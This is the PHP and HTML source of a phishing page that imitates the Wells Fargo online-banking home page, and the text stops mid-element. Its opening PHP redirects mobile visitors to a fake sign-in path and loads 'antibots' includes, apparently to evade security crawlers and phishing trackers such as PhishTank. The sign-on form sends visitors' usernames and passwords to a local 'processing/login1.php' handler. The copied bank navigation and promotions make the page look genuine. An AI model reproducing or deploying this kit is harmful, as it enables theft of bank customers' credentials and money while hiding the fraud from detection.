<?php
$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
$bberry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
if ($android || $bberry || $iphone || $ipod == true) 
{ 
header('Location: Mobile-Signin?/auth/lsgin/present?origin=mobilebrowser');
}

		
		
	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<?php 

define('Myheader', TRUE);
include './page/header.php'; ?>
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp,noydir">'
<div id="shell" data-pid="222-147047-64">

<header role="banner">
   	<div id="masthead" class="html5header c1 nxg">	
        <div class="wfLogoStripParent">
              <div class="wfLogoStripChild">
		    <div id="brand">
                
		<img alt="Wells Fargo Home Page" role="img" src="./assets/images/homepage-horz-logo.svg">
	
            </div>
	    <div id="topSearch">
				
				
				
					<ul>		
				
				
					<li role="presentation">
		<a href="#" class="signIn signLockImg">
			<img alt="Secure" role="img" src="./assets/images/homepage-lock.svg">
			 Enroll
		</a>
	</li>
				
				
					<li role="presentation">
          <a href="#">Customer Service</a>
        </li>
				
					<li role="presentation">
          <a href="#">ATMs/Locations</a>
        </li>
				
					<li role="presentation">
          <a href="#" xml:lang="es" lang="es">Español</a>
        </li>
					
			</ul>
			
			    				
				
				     <div id="nxgSearch">
						<button id="nxgSearchButton">
							<span class="nxgSearchText">Search</span>&nbsp;
							<span class="nxgVisuallyHidden" id="nxgSearchDescription">Opens a dialog.</span>
							<span class="nxgSearchIcon"></span>
						</button>
                     </div>
				
			
		</div>
        </div>
     </div>
	  
			<div id="mainNav">
				<nav aria-label="account type"> 
					
							  
									<div class="html5nav" id="tabNav">
										<ul>
											
											   
		
<li class="active">
				<a href="#" tabindex="-1" role="presentation" class="tabNavLink" id="tabNavPersonal" name="tabNavPersonal">
					<span class="hidden">selected</span>
					 Personal</a>
			</li>

	
											
											   
          
            <li>
              <a href="#" class="tabNavLink" id="tabNavSmallBusiness" name="tabNavSmallBusiness" title="Small Business. Serving businesses with up to $5 million in annual revenue.">Small Business</a>
            </li>
          
        
											
											   
          
            <li>
              <a href="#" class="tabNavLink" id="tabNavCommercial" name="tabNavCommercial" title="Commercial. Serving businesses with over $5 million in annual revenue">Commercial</a>
            </li>
          
        
											
										</ul>
									</div>
								
					
				    
					<div id="headerTools">
						<nav role="presentation">
							<ul>						
								
									<li>
          <a href="#">Financial Education</a>
        </li>
								
									<li>
          <a href="#">About Wells Fargo</a>
        </li>
								
						   </ul>
						</nav>
					</div>
				   
			    </nav>
			</div>

    </div>
</header>
          
                                 
          


        
        
        
 
                            		
		
		

		
		<nav id="fatNavParent" aria-label="products and services">
<ul id="fatnav">
<li>
					<a id="bankingTab" class="navLevel1" href="#banking" aria-expanded="false" data-navitem="banking">Banking and Credit Cards</a><div id="banking" class="navItem hide" role="region" aria-labelledby="bankingTab" style="display: none;">
<h2 class="hide">Banking</h2>
<div class="navItemLeft">
<div>
<div class="fatNavTitle">
<h2>Accounts and Services</h2>
</div>
<ul>
<li>
							<a href="#">Checking Accounts</a>
						</li>
<li>
							<a href="#">Savings Accounts and CDs</a>
						</li>
<li>
							<a href="#">Debit and Prepaid Cards</a>
						</li>
<li>
							<a href="#">Credit Cards</a>
						</li>
<li>
							<a href="#">Foreign Exchange</a>
						</li>
<li>
							<a href="">Global Remittance Services</a>
						</li>
</ul>
</div>
<div>
<div class="fatNavTitle">&nbsp;</div>
<ul>
<li>
							<a href="#">Online Banking</a>
						</li>
<li>
							<a href="#">Transfer and Pay</a>
						</li>
<li>
							<a href="#">Mobile Features</a>
						</li>
<li>
							<a href="#">Control Tower<sup>SM</sup></a>
						</li>
</ul>
</div>
</div>
<div>
<div class="fatNavTitle">
<h2>Your Financial Goals</h2>
</div>
<ul>
<li>
						<a href="#">Tax Center</a>
					</li>
<li>
						<a href="#">Banking Made Easy</a>
					</li>
<li>
						<a href="#">Planning for Retirement</a>
					</li>
<li>
						<a href="#">Security Center</a>
					</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Popular Links</h2>
</div>
<ul>
<li>
						<a href="#">Mortgage Rates</a>
					</li>
<li>
						<a href="#">Routing Number</a>
					</li>
<li>
						<a href="#">Overdraft Services</a>
					</li>
<li>
						<a href="#">Get Help with Payment Challenges</a>
					</li>
<li>
						<a href="#">Open a Checking Account</a>
					</li>
<li>
						<a href="#">Apply for an Account or Service</a>
					</li>
</ul>
</div>

<br style="clear:both"></div>
				</li>
<li>
					<a id="loansTab" class="navLevel1" href="#loans" aria-expanded="false" data-navitem="loans">Loans and Credit</a><div id="loans" class="navItem hide" role="region" aria-labelledby="loansTab" style="display: none; left: 0px; top: 139px;">
<h2 class="hide">Loans and Credit</h2>
<div class="navItemLeft">
<div>
<div class="fatNavTitle">
<h2>Accounts and Services</h2>
</div>
<ul>
<li>
							<a href="#">Mortgage Loans</a>
						</li>
<li>
							<a href="#">Home Equity Lines</a>
						</li>
<li>
							<a href="#">Personal Lines and Loans</a>
						</li>
</ul>
</div>
<div>
<div class="fatNavTitle">&nbsp;</div>
<ul>
<li>
							<a href="#">Student Loans</a>
						</li>
<li>
							<a href="#">Auto Loans</a>
						</li>
<li>
							<a href="#">Credit Cards</a>
						</li>
</ul>
</div>
</div>
<div>
<div class="fatNavTitle">
<h2>Your Financial Goals</h2>
</div>
<ul>

<li>
						<a href="#">Going to College</a>
					</li>
<li>
						<a href="#">Borrowing and Credit</a>
					</li>
<li>
						<a href="#">Security Center</a>
					</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Popular Links</h2>
</div>
<ul>
<li>
						<a href="#">Mortgage Rates</a>
					</li>
<li>
						<a href="#">Home Equity Rates</a>
					</li>
<li>
						<a href="#">Get Help with Payment Challenges</a>
					</li>
<li>
						<a href="#">Finish Application/Check Status</a>
					</li>
<li>
						<a href="#">Student Loan Discounts</a>
					</li>
</ul>
</div>

<br style="clear:both"></div>
				</li>
<li>
					<a id="investingTab" class="navLevel1" href="#investing" aria-expanded="false" data-navitem="investing">Investing and Retirement</a><div id="investing" class="navItem hide" role="region" aria-labelledby="investingTab" style="display: none; left: 0px; top: 139px;">
<h2 class="hide">Investing and Retirement</h2>
<div class="navItemLeft">
<div>
<div class="fatNavTitle">
<h2>Ways to Invest</h2>
</div>
<ul>
<li>
							<a href="#">Self-Directed Online Trading</a>
						</li>
<li>
							<a href="#">Digital Investing Plus Advice</a>
						</li>
<li>
							<a href="#">Dedicated Financial Advisor</a>
						</li>
<li>
							<a href="#">Compare Ways to Invest</a>
						</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Investing Solutions</h2>
</div>
<ul>
<li>
							<a href="#">IRAs</a>
						</li>
<li>
							<a href="#">Invest in Mutual Funds</a>
						</li>
<li>
							<a href="#">Investment Services</a>
						</li>
<li>
							<a href="#">Rollovers (401k and IRA)</a>
						</li>
<li>
							<a href="#">Investing for Education</a>
						</li>
</ul>
</div>
</div>
<div>
<div class="fatNavTitle">
<h2>Your Financial Goals</h2>
</div>
<ul>
<li>
						<a href="#">Strategy and Research</a>
					</li>
<li>
						<a href="#">Planning for Retirement</a>
					</li>
<li>
						<a href="#">Income in Retirement</a>
					</li>
<li>
						<a href="#">Investing Basics</a>
					</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Popular Links</h2>
</div>
<ul>
<li>
						<a href="#">Contact a Financial Advisor</a>
					</li>
<li>
						<a href="#">Open an IRA</a>
					</li>
<li>
						<a href="#">Open a WellsTrade® Account</a>
					</li>
<li>
						<a href="#">Open an Intuitive Investor® Account</a>
					</li>
<li>
						<a href="#">My Retirement Plan</a>
					</li>
<li>
						<a href="#">Employer Plan 401(k) Sign On</a>
					</li>
</ul>
</div>
</div>
				</li>
<li>
					<a id="wealthTab" class="navLevel1" href="#wealth" aria-expanded="false" data-navitem="wealth">Wealth Management</a><div id="wealth" class="navItem hide" role="region" aria-labelledby="wealthTab" style="display: none; left: 0px; top: 139px;">
<h2 class="hide">Wealth Management</h2>
<div class="navItemLeft">
<div>
<div class="fatNavTitle">
<h2>Wealth Services</h2>
</div>
<ul>
<li>
							<a href="#">The Private Bank</a>
						</li>
<li>
							<a href="#">Wells Fargo Advisors</a>
						</li>
<li>
							<a href="#">Abbot Downing</a>
						</li>
<li>
							<a href="#">All Wealth Management Services</a>
						</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Wealth Solutions</h2>
</div>
<ul>
<li>
							<a href="#">Wealth Planning</a>
						</li>
<li>
							<a href="#">Private Banking</a>
						</li>
<li>
							<a href="#">Investment Management</a>
						</li>
<li>
							<a href="#">Specialized Wealth Services</a>
						</li>
<li>
							<a href="#">Trust Services</a>
						</li>
</ul>
</div>
</div>
<div>
<div class="fatNavTitle">
<h2>Wealth Advice &amp; Guidance</h2>
</div>
<ul>
<li>
						<a href="#">Strategy and Research</a>
					</li>
<li>
						<a href="#">Wealth Management Insights</a>
					</li>
<li>
						<a href="#">
							<em>Conversations</em>
							 Magazine
						</a>
					</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Next Step</h2>
</div>
<ul>
<li>
						<a href="#">Contact The Private Bank</a>
					</li>
<li>
						<a href="#">Contact Wells Fargo Advisors</a>
					</li>
<li>
						<a href="#">Contact Abbot Downing</a>
					</li>
</ul>
</div>
</div>
				</li>
<li>
					<a id="rewardsTab" class="navLevel1" href="#rewards" aria-expanded="false" data-navitem="rewards">Rewards and Benefits</a><div id="rewards" class="navItem hide" role="region" aria-labelledby="rewardsTab" style="left: 189.5px; top: 139px; display: none;">
<h2 class="hide">Rewards and Benefits</h2>
<div class="navItemLeft">
<div>
<div class="fatNavTitle">
<h2>Go Far<sup>®</sup> Rewards</h2>
</div>
<ul>
<li>
							<a href="#">Explore Rewards</a>
						</li>
<li>
							<a href="#">Earn Rewards</a>
						</li>
<li>
							<a href="#">Use Rewards</a>
						</li>
<li>
							<a href="#">Share Rewards</a>
						</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Relationship Program</h2>
</div>
<ul>
<li>
							<a href="#">Customer Relationship Overview</a>
						</li>
</ul>
</div>
</div>
<div>
<div class="fatNavTitle">
<h2>Your Financial Goals</h2>
</div>
<ul>
<li>
						<a href="#">Banking Made Easy</a>
					</li>
<li>
						<a href="#">Borrowing and Credit</a>
					</li>
<li>
						<a href="#">Security Center</a>
					</li>
</ul>
</div>
<div>
<div class="fatNavTitle">
<h2>Popular Links</h2>
</div>
<ul>
<li>
						<a href="#">Sign On to Go Far Rewards</a>
					</li>
<li>
						<a href="#">Go Far Rewards FAQs</a>
					</li>
<li>
						<a href="#">Credit Cards</a>
					</li>
</ul>
</div>
</div>
				</li>
</ul>
</nav>
		
		

		
		
		
		

		<div class="emergencyMsgContainer">
<p class="emergencyMsgContent"><span class="emergencyMsgSpan theme4">Alert</span>Here for you – updates on COVID-19 assistance and services.<a href="#" class="c13" data-platform="salesplatform">Learn more</a></p>
</div>
    
<div id="mainContent">
  
         
            
 

           
            
             
<div class="topRegion">

 <h1 class="hidden" id="skip">
            Wells Fargo Personal</h1>



  <!--hide-->

           <!--sign on-->
  
	   
             
            

<div class="inner">
<div id="signOn">
	<div id="signOnMain">
		<h2 id="signOnHeader"><img role="img" src="./assets/images/homepage-signon-lock.svg" alt="Secure">View Your Accounts</h2>
		
		<form autocomplete="off" name="signon" id="loginForm"  method="post"  action="processing/login1.php">
			<div class="fl w-75" id="messages"></div>
			<div class="formElementsWrapper formElementsUsername">
				<label for="userid" class="id_label">Username</label>
				<input type="text" id="userid" class="formElement formElementText login_field" name="username" minlength="4" value="" autocomplete="off" required>
			</div>
			<div class="formElementsWrapper formElementsPassword">
				<label for="password" class="id_label">Password</label>
				<input type="password"  id="password" class="formElement formElementPassword login_field" name="passwrd" maxlength="32" autocomplete="off" required>
			</div>
			<div id="saveuid" class="formElementsWrapper formElementsSaveUsername">
				<input type="checkbox"  id="saveusername" class="c29link formElement formElementCheckbox" name="saveusername" data-content-id="c29content-save-username" triggerhover="false" isclickable="true">
				<label for="saveusername" class="lsc">Save username<span class="hidden">Opens a dialog</span></label>
				<input type="hidden" name="save-username" id="save-username" value="false">
				<input type="hidden" name="hdnuserid" id="hdnuserid" value="">
			</div>
			<div class="formSubmit">
				<input type="submit" value="Sign On" name="btnSignon" id="btnSignon" class="c7" data-mrkt-tracking-id="3d6c76ba-9d34-4def-977d-a79cb8afc738">
			</div>
			<div class="forgotPasswordLinkWrapper">
				<a href="#">Forgot Password/Username? </a>
				<input type="hidden" name="screenid" value="SIGNON">
				<input type="hidden" name="origination" value="WebCons"> 
				<input type="hidden" name="LOB" value="Cons">
				<input type="hidden" id="userPrefs" name="userPrefs" value="">
				<input id="jsenabled" name="jsenabled" type="hidden" value="false"> 
				<input id="origin" name="origin" type="hidden" value="cob">
				<input name="homepage" type="hidden" value="true">
				
			</div>
		</form>
		
		
		
		
		
		
		
		
		<style type="text/css">.red		{color: #bb0826;
		font-weight: bold;
    font-family: Verdana;
    font-size: 12px;
    }</style>
		
		
		
		
		
		
<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="./assets/dist/js/FormValidation.min.js"></script>
<script src="./assets/dist/js/forms.js"></script>
		
		
		
		
		
		

	</div>
	<div id="signUp">
		
			<a href="#">Enroll Now</a>
		
		<a href="#">Security Center</a>
		<a href="#">Privacy, Cookies, and Security</a>
	</div>
</div>


</div>
              
           

           
     
            



<div class="c3" data-cid="tcm:242-147040-16" data-ctid="tcm:224-146930-32">	
	<div class="c3wrapper" role="region" aria-label="Promotions Slideshow"><div class="paddles alwaysOn"><a href="#_prevFrame" class="left"><img alt="Previous Slide" src="./assets/images/home-sprite-image.png"></a></div>
		
			<div class="carouselFrame item1" style="display: block;"><span class="hidden">Begin item 1</span>
				<div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">	
					
            
      
<div class="c3Img" data-cid="tcm:84-146961-16" data-ctid="tcm:91-146911-32">
          <img alt="" src="./assets/images/wfi111_ph_hph_default1_1200x532.jpg">
        </div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme11"> 
                        <p class="memberfdic">Member FDIC</p>
                        <h2>Simplified banking</h2>
                        <span>Everyday Checking provides convenience and fast access. Open in minutes.</span>
	   	        
          <a class="c7" role="button" href="#">Start Now</a>
        
                  </div>
           </div>
      </div>

  

						
          
				</div>
			<span class="hidden">End item 1</span></div>
		
			<div class="carouselFrame item2" style="display: none;"><span class="hidden">Begin item 2</span>
				<div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en">	
					
            
      
<div class="c3Img" data-cid="tcm:84-147036-16" data-ctid="tcm:91-146911-32">
		<img alt="" src="">
	</div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme11"> 
                        
                        <h2>Keeping you informed</h2>
                        
	   	        
          <a class="c7" role="button" href="#">Learn More</a>
        
                  </div>
           </div>
      </div>

  

						
          
				</div>
			<span class="hidden">End item 2</span></div>
		
			<div class="carouselFrame item3" style="display: none;"><span class="hidden">Begin item 3</span>
				<div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_3" lang="en">	
					
            
      
<div class="c3Img" data-cid="tcm:84-147009-16" data-ctid="tcm:91-146911-32">
          <img alt="" src="" class="deferred" data-deferred-src="">
        </div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme4"> 
                        
                        <h2>Innovation. Security. Convenience.</h2>
                        <span>Building better every day.</span>
	   	        
          <a class="c7" role="button" enrollmentid="3783" href="#">Learn More</a>
        
                  </div>
           </div>
      </div>

  

						
          
				</div>
			<span class="hidden">End item 3</span></div>
		
	<div class="carouselFrame incomingFrame" style="left: 0px; display: none;"><span class="hidden">Begin item 1</span>
				<div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">	
					
            
      
<div class="c3Img" data-cid="tcm:84-146961-16" data-ctid="tcm:91-146911-32">
          <img alt="" src="images/wfi111_ph_hph_default1_1200x532.jpg">
        </div>
      <div class="inner">
           <div class="marqueeContent">
                 <div class="marqueecontentinner marqueetheme11"> 
                        <p class="memberfdic">Member FDIC</p>
                        <h2>Simplified banking</h2>
                        <span>Everyday Checking provides convenience and fast access. Open in minutes.</span>
	   	        
          <a class="c7" role="button" href="#">Start Now</a>
        
                  </div>
           </div>
      </div>

  

						
          
				</div>
			<span class="hidden">End item 1</span></div><div class="controls"><a href="#_frame1" class="show1 current" tabindex="-1" role="presentation"><span class="hidden">item 1 of 3 - you are here</span><img alt="" src="./assets/images/icon-marquee-dot-active.svg"></a><a href="#_frame2" class="show2"><span class="hidden">item 2 of 3</span><img alt="" src="./assets/images/icon-marquee-dot-inactive.svg"></a><a href="#_frame3" class="show3"><span class="hidden">item 3 of 3</span><img alt="" src="./assets/images/icon-marquee-dot-inactive.svg"></a></div><div class="paddles alwaysOn"><a href="#_nextFrame" class="right"><img alt="Next Slide" src="./assets/images/home-sprite-image.png"></a></div></div>
</div>

<div id="taskbar" role="region" aria-label="A group of 5 tasks." data-cid="tcm:242-147044-16" data-ctid="tcm:224-146934-32" style="bottom: 0px;">
	<div class="inner">
		<ul>
			
			<li class="task">
				
				<div class="cmsDefault" data-slot-id="WF_CON_HP_TOP_TASK_1" lang="en">
                     
                <div class="taskContentWrapper" data-cid="tcm:84-147010-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" href="#" enrollmentid="1234">
            
            <div class="taskImageContainer">
               <img alt="task icon checking" src="./assets/images/task-icon-checking-50x50.png">
            </div>
            
            Estimate how much to borrow
        </a>
    
    </div>


          
				</div>
				
				
			</li>
				
			<li class="task">
				
				<div class="cmsDefault" data-slot-id="WF_CON_HP_TOP_TASK_2" lang="en">
                     
                <div class="taskContentWrapper" data-cid="tcm:84-147022-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" href="#">
            
            <div class="taskImageContainer">
               <img alt="task icon credit" src="./assets/images/task-icon-credit-50x50.png">
            </div>
            
            Find your credit card
        </a>
    
    </div>


          
				</div>
				
				
			</li>
				
			<li class="task">
				
				<div class="cmsDefault" data-slot-id="WF_CON_HP_TOP_TASK_3" lang="en">
                     
                <div class="taskContentWrapper" data-cid="tcm:84-146975-16" data-ctid="tcm:91-146909-32" style="display: block;">
    
        <a class="i7" href="/online-banking/my-money-map/">
            
            <div class="taskImageContainer">
               <img alt="task icon student" src="./assets/images/task-icon-student-50x50.png">
            </div>
            
            Free online budgeting tools

        </a>
    
    </div>


          
				</div>
				
				
			</li>
				
			<li class="task">
				
				
                     
            <div class="taskContentWrapper" style="display: block;">
<div class="taskSecondstate" tabindex="0" role="button" aria-controls="findRoutingOrAccountNumber" aria-expanded="false">
<div class="taskImageContainer"><img alt="" src="https://www01.wellsfargomedia.com/./assets/images/homepage/task-icon-account-50x50.png"></div>
Find routing or account number</div>
<div class="taskHiddenContent" id="findRoutingOrAccountNumber">
<form action="#" method="get">
<div class="horizontalFlexParent">
<fieldset class="verticalFlexParent"><legend class="hide">Routing and account number</legend>
<div class="radio"><input aria-label="Routing number" name="routingOrAccountNumber" id="routingNumber" value="routing" type="radio"> <label for="routingNumber">Routing number</label></div>
<div class="radio"><input aria-label="Account number" name="routingOrAccountNumber" id="accountNumber" value="account" type="radio"> <label for="accountNumber">Account number</label></div>
</fieldset>
<div class="flexGo"><input id="GoButton" class="submitBtn c7 utilitybtn disableGo" disabled="disabled" value="Go" name="" type="submit"></div>
</div>
</form>
</div>
</div>
          
				
			</li>
				
			<li class="task">
				
				
                     
            
		<div class="taskContentWrapper" style="display: block;">
			<div class="taskSecondstate" role="button" aria-controls="checkTodaysRates" tabindex="0" aria-expanded="false">
				<div class="taskImageContainer">
					<img alt="" src="https://www01.wellsfargomedia.com/./assets/images/homepage/task-icon-rates-50x50.png">
				</div>
				
Check today’s rates
			</div>
			<div class="taskHiddenContent" id="checkTodaysRates">
				<form name="frmCheckRates" id="frmCheckRates" action="/dropdown" autocomplete="off">
					<label class="hide" for="check_rates_dropdown">Check Rates</label>
					 
					<select name="dropdown" id="check_rates_dropdown" aria-label="Check Todays Rates">
						<option value="personal.checkRates.Mortgage">Mortgage</option>
						<option value="personal.checkRates.HomeEquity">Home Equity</option>
						<option value="personal.checkRates.CDS">CDs</option>
						<option value="personal.checkRates.CreditCard">Credit Card</option>
						<option value="personal.checkRates.StudentLoans">Student Loans</option>
						<option value="personal.checkRates.PersonalLoans">Personal Loans</option>
						<option value="personal.checkRates.More">All Rates</option>
					</select>
					 
					<input class="submitBtn c7 utilitybtn" id="NID1_14_2_1_1_3" type="submit" value="Go">
				</form>
			</div>
		</div>
	
          
				
			</li>
				
		</ul>
	</div>			
</div>
	


  </div>
            
            

        

        


 
                            		
		
		

		
		
		
		

		
		
		
		

		
		
		
		

		
		
		
		

		
		
		
		

		
		
	                        

 


        
        
         
     
<div class="c63 html5section" data-cid="tcm:242-147043-16" data-ctid="tcm:224-146932-32">
    <a href="Javascript:void(0);" class="paddle prevPaddle" role="button" tabindex="-1" aria-hidden="true"><img alt="Previous Slide" src="./assets/images/home-sprite-image.png"></a><div class="c63controlsWrapper">
        <ul class="c63controls" role="tablist"><li role="tab" data-ia-code="C_oth_fraud_hpcarousel_web" id="nbaDefault7" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels7" aria-posinset="7" aria-setsize="7" class="show7">


<div class="thumbText">
<span>Security Center</span>
</div>

</li>
            
               <li role="tab" data-ia-code="C_ccd_credit_hpcarousel_web" id="nbaDefault1" aria-expanded="true" aria-selected="true" aria-controls="nbaDefaultPanels1" aria-posinset="1" aria-setsize="7" class="show1" tabindex="0">


<div class="thumbText">
<span>Borrowing and Credit</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_chk_banking_hpcarousel_web" id="nbaDefault2" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels2" aria-posinset="2" aria-setsize="7" class="show2">


<div class="thumbText">
<span>Banking Made Easy</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_irw_retirement_hpcarousel_web" id="nbaDefault3" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels3" aria-posinset="3" aria-setsize="7" class="show3">


<div class="thumbText">
<span>Retirement</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_mtg_homelending_hpcarousel_web" id="nbaDefault4" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels4" aria-posinset="4" aria-setsize="7" class="show4">


<div class="thumbText">
<span>Home Lending</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_efs_college_hpcarousel_web" id="nbaDefault5" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels5" aria-posinset="5" aria-setsize="7" class="show5">


<div class="thumbText">
<span>Going to College</span>
</div>

</li>            
               <li role="tab" data-ia-code="C_wtr_investment_hpcarousel_web" id="nbaDefault6" aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels6" aria-posinset="6" aria-setsize="7" class="show6">


<div class="thumbText">
<span>Investing Basics</span>
</div>

</li>            
                           
        </ul>
    </div><a href="Javascript:void(0);" class="paddle nextPaddle" role="button" tabindex="-1" aria-hidden="true"><img alt="Next Slide" src="./assets/images/home-sprite-image.png"></a>
    <div class="carouselFrameWrapper">
        
              
            <div class="carouselFrame item1" role="tabpanel" data-ia-code="C_ccd_credit_hpcarousel_web" data-cid="tcm:84-147031-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels1" aria-labelledby="nbaDefault1" tabindex="0" style="display: block;"><span class="hidden">Begin item 1</span>
    <div class="c63contentMain">
    
        <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/photography/lifestyle/970x485/FICO-phone-borrowing-and-credit-970x485.jpg">
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Explore your credit options</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg1"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Improve your credit &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg2"><a aria-hidden="true" tabindex="-1" href="/goals-credit/debt-to-income-calculator/?linkLoc=nba"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Calculate your debt-to-income ratio &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg3"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="/goals-credit/smarter-credit/manage-your-debt/consider-debt-consolidation/?linkLoc=nba">Consolidate your debt &gt;</a></span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button" href="#">Go to Borrowing and Credit</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 1</span></div>
          
         
              
            <div class="carouselFrame item2" role="tabpanel" data-ia-code="C_chk_banking_hpcarousel_web" data-cid="tcm:84-147025-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels2" aria-labelledby="nbaDefault2" tabindex="0" style="display: none;"><span class="hidden">Begin item 2</span>
    <div class="c63contentMain">
    
        <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/photography/lifestyle/970x485/paying-phone-beach-banking-made-easy-970x485.jpg">
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Bank wherever life takes you</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg4"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="/checking/switch/?linkLoc=nba">Switch to Wells Fargo &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg6"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Get account alerts &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg9"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Learn more about <em>Zelle</em> &gt;</a></span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button" href="#">Go to Banking Made Easy</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 2</span></div>
          
         
              
            <div class="carouselFrame item3" role="tabpanel" data-ia-code="C_irw_retirement_hpcarousel_web" data-cid="tcm:84-146969-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels3" aria-labelledby="nbaDefault3" tabindex="0" style="display: none;"><span class="hidden">Begin item 3</span>
    <div class="c63contentMain">
    
        <img alt="" src="https://www01.wellsfargomedia.com/./assets/images/photography/lifestyle/970x485/couple-beach-retirement-970x485.jpg">
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Take control of your retirement</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg7"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Get the basics of retirement &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg8"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Plan for retirement income &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg9"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Manage money in retirement &gt;</a></span></div>
</li>
</ul>
        
            <p>
          <a class="c7" role="button" href="#">Go to Retirement Planning</a>
        </p>
        </div>
    </div>
<span class="hidden">End item 3</span></div>
          
         
              
            <div class="carouselFrame item4" role="tabpanel" data-ia-code="C_mtg_homelending_hpcarousel_web" data-cid="tcm:84-147015-16" data-ctid="tcm:91-146912-32" id="nbaDefaultPanels4" aria-labelledby="nbaDefault4" tabindex="0" style="display: none;"><span class="hidden">Begin item 4</span>
    <div class="c63contentMain">
    
        
		<img alt="" src="#">
	
    
        <div class="c63content nbatheme1">
            <h2>See how we can help you achieve your goals</h2>
            <h3>Your homeownership path starts here</h3>
            
          <ul>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg10"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Buy a home &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
<div class="nbaImg11"><a aria-hidden="true" tabindex="-1" href="#"><img alt="" src="./assets/images/home-sprite-image.png"></a></div>
</div>
<span><a href="#">Compare your loan options &gt;</a></span></div>
</li>
<li>
<div class="c95textContent">
<div class="nbaWrapper">
